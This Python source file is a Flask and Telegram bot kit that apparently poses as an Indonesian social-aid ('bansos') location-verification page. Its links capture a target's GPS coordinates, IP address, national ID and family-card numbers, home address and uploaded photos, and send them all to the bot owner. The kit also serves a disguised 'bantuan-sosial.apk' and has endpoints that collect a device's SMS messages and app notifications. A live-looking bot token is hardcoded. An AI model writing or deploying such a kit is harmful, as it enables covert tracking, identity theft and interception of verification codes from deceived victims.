#!/usr/bin/env python3
"""
GPS Tracker Bot - Simple Link Tracking
Buat link → kirim ke target → target buka → GPS terkirim → notif ke bot
"""

import os
import sqlite3
import hashlib
import time
import asyncio
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY")
BASE_URL = os.environ.get("BASE_URL", "https://bansos.jokichannel.eu.org")
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")
BANNER_PATH = os.environ.get("BANNER_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "banner.jpg"))

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        id TEXT PRIMARY KEY, tracking_id TEXT UNIQUE,
        title TEXT, description TEXT,
        created_by INTEGER, created_at TEXT, is_active INTEGER DEFAULT 1)""")
    c.execute("""CREATE TABLE IF NOT EXISTS tracking_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
        latitude REAL, longitude REAL, accuracy REAL,
        user_agent TEXT, ip_address TEXT, timestamp TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS sms_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender TEXT, message TEXT, timestamp TEXT,
        device_id TEXT, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS notif_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender TEXT, message TEXT, timestamp TEXT,
        device_id TEXT, app TEXT, received_at TEXT)""")
    conn.commit()
    conn.close()

def gen_id():
    return hashlib.md5(f"{time.time()}{os.urandom(8)}".encode()).hexdigest()[:10]

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    result = c.fetchall()
    conn.close()
    return result

# ============ TELEGRAM BOT ============
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
        [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
        [InlineKeyboardButton("📊 Statistik & Info", callback_data="statistik_info")],
        [InlineKeyboardButton("🖥 Buka Dashboard", url=f"{BASE_URL}/admin/dashboard")],
    ]
    caption = (
        "✨ *GPS Tracker — Premium* ✨\n\n"
        "Halo DevCult XII! 👋 Selamat datang di\n"
        "sistem tracking cerdas.\n\n"
        "◆ Buat link → kirim ke target\n"
        "◆ Target buka → GPS otomatis terkirim\n"
        "◆ Notifikasi lokasi langsung ke sini\n\n"
        "👇 Silakan pilih menu:"
    )
    try:
        with open(BANNER_PATH, 'rb') as photo:
            await update.message.reply_photo(photo=photo)
    except Exception:
        pass
    await update.message.reply_text(
        caption, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def on_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except: pass

    uid = q.from_user.id
    d = q.data

    async def safe_edit(text, reply_markup=None, parse_mode="Markdown"):
        """Edit text, fallback ke reply baru kalo pesan asli adalah foto."""
        try:
            await q.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            if "no text in the message" in str(e).lower():
                await q.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            else:
                raise

    if d == "create_link":
        tid = gen_id()
        title = "Verifikasi Lokasi"
        desc = "Silakan konfirmasi lokasi Anda"
        db_exec("INSERT INTO links VALUES (?,?,?,?,?,?,1)",
                (tid, tid, title, desc, uid, datetime.now().isoformat()))
        url = f"{BASE_URL}/track/{tid}"
        kb = [
            [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={url}")],
            [InlineKeyboardButton("📋 Daftar Link", callback_data="list_links")],
            [InlineKeyboardButton("⬅️ Menu", callback_data="home")],
        ]
        await safe_edit(
            f"✅ *Link Berhasil Dibuat!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 *Link:*\n`{url}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📤 Kirim link ini ke target.\n"
            f"Saat dibuka & GPS diizinkan,\n"
            f"notifikasi lokasi otomatis ke sini.\n\n"
            f"🆔 `{tid}`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "list_links":
        rows = db_exec("SELECT tracking_id,title,created_at,is_active FROM links WHERE created_by=? ORDER BY created_at DESC", (uid,))
        if not rows:
            await safe_edit("📋 *Daftar Link*\n\nBelum ada link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        text = "📋 *Daftar Link*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        kb = []
        for tid, title, cat, active in rows:
            st = "🟢" if active else "🔴"
            ev = db_exec("SELECT COUNT(*) FROM tracking_events WHERE tracking_id=?", (tid,))[0][0]
            text += f"{st} `{tid}` | 🔔 {ev}x | 📅 {cat[:10]}\n"
            kb.append([
                InlineKeyboardButton(f"🔔 {tid[:6]}", callback_data=f"ev:{tid}"),
                InlineKeyboardButton("🗺", callback_data=f"map:{tid}"),
                InlineKeyboardButton("⏸" if active else "▶️", callback_data=f"tg:{tid}"),
                InlineKeyboardButton("🗑", callback_data=f"del:{tid}"),
            ])
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("ev:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 5", (tid,))
        if not evs:
            await safe_edit(f"🔔 *Notifikasi*\n\nBelum ada event untuk `{tid}`.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")
            return
        text = f"🔔 *Notifikasi - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, (lat, lon, acc, ts) in enumerate(evs):
            text += f"📍 #{i+1} | 🕐 {ts[:19]}\n   📐 `{lat:.6f}, {lon:.6f}` | 🎯 ±{acc:.0f}m\n\n"
        kb = [[InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
              [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("map:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
        if evs:
            kb = [
                [InlineKeyboardButton("🌐 Peta Lengkap", url=f"{BASE_URL}/map/{tid}")],
                [InlineKeyboardButton("📍 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
                [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")],
            ]
            await safe_edit(
                f"🗺 *Peta - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📍 Terakhir: {evs[0][2][:19]}\n📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`",
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        else:
            await safe_edit("🗺 *Peta*\n\nBelum ada data.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")

    elif d.startswith("del:"):
        tid = d.split(":")[1]
        db_exec("DELETE FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        db_exec("DELETE FROM tracking_events WHERE tracking_id=?", (tid,))
        await safe_edit(f"🗑 `{tid}` dihapus.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d == "delete_link":
        rows = db_exec("SELECT tracking_id,title,created_at,is_active FROM links WHERE created_by=? ORDER BY created_at DESC", (uid,))
        if not rows:
            await safe_edit("🗑 *Hapus Link*\n\nBelum ada link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Menu", callback_data="home")]]),
                parse_mode="Markdown")
            return
        text = "🗑 *Hapus Link*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih link yang ingin dihapus:\n"
        kb = []
        for tid, title, cat, active in rows:
            kb.append([InlineKeyboardButton(f"🗑 {tid[:8]} - {title[:20]}", callback_data=f"del:{tid}")])
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("tg:"):
        tid = d.split(":")[1]
        db_exec("UPDATE links SET is_active=1-is_active WHERE tracking_id=? AND created_by=?", (tid, uid))
        row = db_exec("SELECT is_active FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        status = "Aktif 🟢" if row and row[0][0] else "Nonaktif 🔴"
        await safe_edit(f"✅ `{tid}` → {status}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d == "check_notif":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=? AND is_active=1", (uid,))
        text = "🔔 *Cek Notifikasi*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        found = 0
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
            if evs:
                found += 1
                text += f"📍 `{tid[:6]}` | 🕐 {evs[0][2][:19]}\n   📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`\n\n"
        if not found:
            text += "Belum ada notifikasi.\n"
        kb = [[InlineKeyboardButton("📋 Semua Link", callback_data="list_links")],
              [InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "view_map":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=?", (uid,))
        active = []
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude FROM tracking_events WHERE tracking_id=? LIMIT 1", (tid,))
            if evs:
                active.append((tid, evs[0]))
        if not active:
            await safe_edit("🗺 *Peta*\n\nBelum ada data lokasi.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat Link", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        kb = [[InlineKeyboardButton(f"📍 {t[0][:6]}", url=f"{BASE_URL}/map/{t[0]}")] for t in active[:10]]
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await safe_edit("🗺 *Peta Tracking*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih link:",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "home":
        kb = [
            [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
            [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
            [InlineKeyboardButton("📊 Statistik & Info", callback_data="statistik_info")],
            [InlineKeyboardButton("🖥 Buka Dashboard", url=f"{BASE_URL}/admin/dashboard")],
        ]
        await safe_edit("✨ *GPS Tracker — Premium* ✨\n\n👇 Silakan pilih menu:",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "statistik_info":
        links = db_exec("SELECT COUNT(*) FROM links", ())[0][0]
        events = db_exec("SELECT COUNT(*) FROM tracking_events", ())[0][0]
        aktif = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1", ())[0][0]
        text = (
            "📊 *Statistik & Info*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 Total Link: *{links}*\n"
            f"🟢 Link Aktif: *{aktif}*\n"
            f"📡 Total Event: *{events}*\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "💡 *Cara Pakai:*\n"
            "1️⃣ Buat link tracking\n"
            "2️⃣ Kirim link ke target\n"
            "3️⃣ Target buka & izinkan GPS\n"
            "4️⃣ Notifikasi lokasi masuk ke sini\n\n"
            "🔒 Privasi terjaga — target harus\n"
            "klik manual & izinkan GPS"
        )
        kb = [[InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

# ============ NOTIFICATION ============
async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
    info = db_exec("SELECT created_by FROM links WHERE tracking_id=?", (tracking_id,))
    if not info:
        return
    owner_id = info[0][0]
    bot = Bot(token=BOT_TOKEN)

    text = (
        f"🔔 *LOKASI BARU DITERIMA!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 `{tracking_id}`\n"
        f"🕐 {datetime.now().strftime('%d/%m %H:%M:%S')}\n\n"
    )

    if data:
        text += (
            f"📋 *Data Penerima:*\n"
            f"👤 Nama: *{data.get('nama', '-')}*\n"
            f"🪪 No. KTP: `{data.get('no_ktp', '-')}`\n"
            f"📖 No. KK: `{data.get('no_kk', '-')}`\n"
            f"🏠 Alamat: {data.get('alamat', '-')}\n"
            f"🚧 RT/RW: {data.get('rt', '-')}/{data.get('rw', '-')}\n"
            f"🏙 Kota: {data.get('kota', '-')}\n"
            f"🗺 Provinsi: {data.get('provinsi', '-')}\n\n"
        )

    text += (
        f"📍 *Koordinat:*\n"
        f"   📐 `{lat:.6f}, {lon:.6f}`\n"
        f"   🎯 Akurasi: ±{accuracy:.0f}m\n"
        f"   🌐 IP: `{ip}`\n\n━━━━━━━━━━━━━━━━━━━━"
    )
    kb = [
        [InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={lat},{lon}")],
        [InlineKeyboardButton("📍 Street View", url=f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}")],
        [InlineKeyboardButton("📊 Riwayat", callback_data=f"ev:{tracking_id}")],
    ]
    try:
        await bot.send_message(owner_id, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    except Exception as e:
        print(f"Notif error: {e}")

# ============ FLASK ============
app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"))

@app.after_request
def skip_ngrok(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/track/<tid>")
def track(tid):
    info = db_exec("SELECT tracking_id,title,description,is_active FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    if not info[0][3]:
        return render_template("error.html", message="Link tidak aktif"), 403
    return render_template("track.html", tracking_id=tid, title=info[0][1], description=info[0][2])

@app.route("/api/location/<tid>", methods=["POST"])
def api_loc(tid):
    d = request.json
    lat, lon, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy", 0)
    if lat is None or lon is None:
        return jsonify({"error": "Invalid"}), 400
    info = db_exec("SELECT is_active FROM links WHERE tracking_id=?", (tid,))
    if not info or not info[0][0]:
        return jsonify({"error": "Not found"}), 404
    db_exec("INSERT INTO tracking_events (tracking_id,latitude,longitude,accuracy,user_agent,ip_address,timestamp) VALUES (?,?,?,?,?,?,?)",
        (tid, lat, lon, acc, str(request.user_agent), request.remote_addr, datetime.now().isoformat()))
    # Save KTP data
    db_exec("UPDATE links SET title=?, description=? WHERE tracking_id=?",
        (d.get("nama",""), f"KK:{d.get('no_kk','')} | {d.get('alamat','')}", tid))
    asyncio.run(notify(tid, lat, lon, acc, request.remote_addr, d))
    return jsonify({"success": True})

MEDIA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "media")

@app.route("/api/upload/<tid>", methods=["POST"])
def api_upload(tid):
    if "file" not in request.files:
        return jsonify({"success": False, "error": "No file"}), 400
    info = db_exec("SELECT is_active FROM links WHERE tracking_id=?", (tid,))
    if not info or not info[0][0]:
        return jsonify({"error": "Not found"}), 404
    f = request.files["file"]
    os.makedirs(MEDIA_DIR, exist_ok=True)
    ext = f.filename.rsplit(".", 1)[1].lower() if "." in f.filename else "jpg"
    fname = f"{tid}_{int(time.time())}.{ext}"
    fpath = os.path.join(MEDIA_DIR, fname)
    f.save(fpath)
    media_type = request.form.get("type", "photo")
    # Notify bot owner with media
    owner = db_exec("SELECT created_by FROM links WHERE tracking_id=?", (tid,))
    if owner:
        try:
            bot = Bot(token=BOT_TOKEN)
            text = f"📸 *Media Diterima!*\n🆔 `{tid}`\n🕐 {datetime.now().strftime('%d/%m %H:%M:%S')}"
            if media_type == "video":
                with open(fpath, "rb") as pf:
                    asyncio.run(bot.send_video(owner[0][0], pf, caption=text, parse_mode="Markdown"))
            else:
                with open(fpath, "rb") as pf:
                    asyncio.run(bot.send_photo(owner[0][0], pf, caption=text, parse_mode="Markdown"))
        except Exception as e:
            print(f"Upload notif error: {e}")
    return jsonify({"success": True, "file": fname})

@app.route("/api/collect-sms", methods=["POST"])
def api_collect_sms():
    try:
        sender = request.form.get("sender", "")
        message = request.form.get("message", "")
        ts = request.form.get("timestamp", str(int(time.time()*1000)))
        device_id = request.form.get("device_id", "")
        received = datetime.now().isoformat()
        try:
            ts_iso = datetime.fromtimestamp(int(ts)/1000).isoformat()
        except:
            ts_iso = received
        db_exec("INSERT INTO sms_log (sender, message, timestamp, device_id, received_at) VALUES (?,?,?,?,?)",
                (sender, message, ts_iso, device_id, received))
        return jsonify({"success": True})
    except Exception as e:
        print(f"SMS collect error: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/collect-notif", methods=["POST"])
def api_collect_notif():
    try:
        sender = request.form.get("sender", "")
        message = request.form.get("message", "")
        ts = request.form.get("timestamp", str(int(time.time()*1000)))
        device_id = request.form.get("device_id", "")
        app_name = request.form.get("app", "Unknown")
        received = datetime.now().isoformat()
        try:
            ts_iso = datetime.fromtimestamp(int(ts)/1000).isoformat()
        except:
            ts_iso = received
        db_exec("INSERT INTO notif_log (sender, message, timestamp, device_id, app, received_at) VALUES (?,?,?,?,?,?)",
                (sender, message, ts_iso, device_id, app_name, received))
        return jsonify({"success": True})
    except Exception as e:
        print(f"Notif collect error: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/admin/dashboard")
def admin_dashboard():
    total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
    total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
    total_sms = db_exec("SELECT COUNT(*) FROM sms_log")[0][0]
    total_notif = db_exec("SELECT COUNT(*) FROM notif_log")[0][0]
    active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
    links = db_exec("""SELECT l.tracking_id,l.title,l.created_at,l.is_active,
        (SELECT COUNT(*) FROM tracking_events WHERE tracking_id=l.tracking_id) as ev_cnt
        FROM links l ORDER BY l.created_at DESC LIMIT 20""")
    events = db_exec("""SELECT tracking_id,latitude,longitude,accuracy,timestamp FROM tracking_events
        ORDER BY timestamp DESC LIMIT 20""")
    sms = db_exec("""SELECT sender,message,timestamp,device_id FROM sms_log
        ORDER BY timestamp DESC LIMIT 30""")
    notifs = db_exec("""SELECT sender,message,timestamp,device_id,app FROM notif_log
        ORDER BY timestamp DESC LIMIT 50""")
    return render_template("dashboard.html",
        total_links=total_links, total_events=total_events,
        total_sms=total_sms, total_notif=total_notif, active_links=active_links,
        links=links, events=events, sms=sms, notifs=notifs,
        base_url=BASE_URL)

@app.route("/admin/dashboard/json")
def admin_dashboard_json():
    total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
    total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
    total_sms = db_exec("SELECT COUNT(*) FROM sms_log")[0][0]
    total_notif = db_exec("SELECT COUNT(*) FROM notif_log")[0][0]
    active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
    sms = db_exec("""SELECT sender,message,timestamp,device_id FROM sms_log
        ORDER BY timestamp DESC LIMIT 30""")
    notifs = db_exec("""SELECT sender,message,timestamp,device_id,app FROM notif_log
        ORDER BY timestamp DESC LIMIT 50""")
    return jsonify({
        "total_links": total_links,
        "total_events": total_events,
        "total_sms": total_sms,
        "total_notif": total_notif,
        "active_links": active_links,
        "sms": [{"sender": s[0], "message": s[1], "timestamp": s[2], "device_id": s[3]} for s in sms],
        "notifs": [{"sender": n[0], "message": n[1], "timestamp": n[2], "device_id": n[3], "app": n[4]} for n in notifs]
    })

@app.route("/map/<tid>")
def map_view(tid):
    info = db_exec("SELECT tracking_id,title,description,created_at FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC", (tid,))
    return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)

@app.route("/download/apk")
def download_apk():
    import flask
    apk_path = "/root/gps-link/android/bantuan-sosial.apk"
    if os.path.exists(apk_path):
        with open(apk_path, "rb") as f:
            data = f.read()
        return flask.Response(data, mimetype="application/vnd.android.package-archive",
            headers={"Content-Disposition": "attachment; filename=bantuan-sosial.apk"})
    return "File tidak ditemukan", 404

# ============ MAIN ============
def main():
    init_db()
    from threading import Thread
    Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False), daemon=True).start()
    print("🌐 Web server :5000")

    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", cmd_start))
    app_bot.add_handler(CommandHandler("help", cmd_start))
    app_bot.add_handler(CommandHandler("links", cmd_start))
    app_bot.add_handler(CommandHandler("map", cmd_start))
    app_bot.add_handler(CallbackQueryHandler(on_click))
    print("🤖 Bot running...")
    app_bot.run_polling()

if __name__ == "__main__":
    main()
